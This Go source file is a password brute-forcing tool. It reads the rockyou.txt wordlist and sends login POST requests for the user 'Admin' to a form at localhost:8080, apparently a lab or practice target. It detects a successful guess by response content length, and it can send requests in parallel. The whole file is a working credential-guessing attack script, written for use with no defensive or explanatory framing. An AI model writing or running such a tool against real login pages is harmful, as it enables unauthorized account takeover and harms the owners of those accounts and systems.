package main

import (
	"bufio"
	"bytes"
	"fmt"
	"log"
	"net/http"
	"os"
	"time"
)

func main() {
	pass := readFile("/usr/share/wordlists/rockyou.txt")
	// pass := readFile("medium.txt")

	concurrent := 0
	
	
	url := "http://localhost:8080/login"

	var good, bad int64
	good = 209
	bad = 219
	user := "Admin"

  if concurrent == 0 {
    for _, passwd := range pass {
      status, _ := request(url, user, passwd, good, bad)
      fmt.Println(status, passwd)
      if status {
        fmt.Println("XXXXXX FFFFFOUND")
        os.Exit(0)
      }
    }
  } else {
    size := len(pass) / concurrent
	  chunks := sliceChunks(pass, size)
    ch := make(chan string)
    for _, chunk := range chunks {
      for i := range chunk {

        go requestParallel(url, user, chunk[i], good, bad, ch)
      }

      for range chunk {
        fmt.Println(<-ch)
      }
    }
  }
}

func fatal(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

func sliceChunks(full []string, chunksize int) [][]string {
	var chunks [][]string

	for i := 0; i < len(full); i += chunksize {
		end := i + chunksize

		if end > len(full) {
			end = len(full)
		}

		chunks = append(chunks, full[i:end])
	}

	return chunks
}

func requestParallel(url, user, passwd string, good, bad int64, ch chan<- string) {
	status, _ := request(url, user, passwd, good, bad)
	var status_str string
	if status {
		status_str = "SUCCESS"
	} else {
		status_str = "FAILED"
	}
	ch <- fmt.Sprintf("%s %s %s", user, passwd, status_str)
}

func request(url string, user, passwd string, good, bad int64) (bool, string) {
	timeout := time.Duration(30 * time.Second)
	client := http.Client{
		Timeout: timeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	data := fmt.Sprintf("username=%s&password=%s", user, passwd)
	reader := bytes.NewReader([]byte(data))
	request, err := http.NewRequest("POST", url, reader)
	if err != nil {
		log.Fatal("XX1", err)
	}

	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := client.Do(request)
	if err != nil {
		log.Fatal("XX2", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusFound {
		fatal(fmt.Errorf("invalid http status: %d", resp.StatusCode))
	}

	if resp.ContentLength == good {
		return true, passwd
	} else if resp.ContentLength != bad {
		fatal(fmt.Errorf("bad content len: %d", resp.ContentLength))
	}

	return false, ""
}

func readFile(path string) []string {
	file, err := os.Open(path)
	fatal(err)
	defer file.Close()

	scanner := bufio.NewScanner(file)
	var out []string
	for scanner.Scan() {
		out = append(out, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}

	return out
}
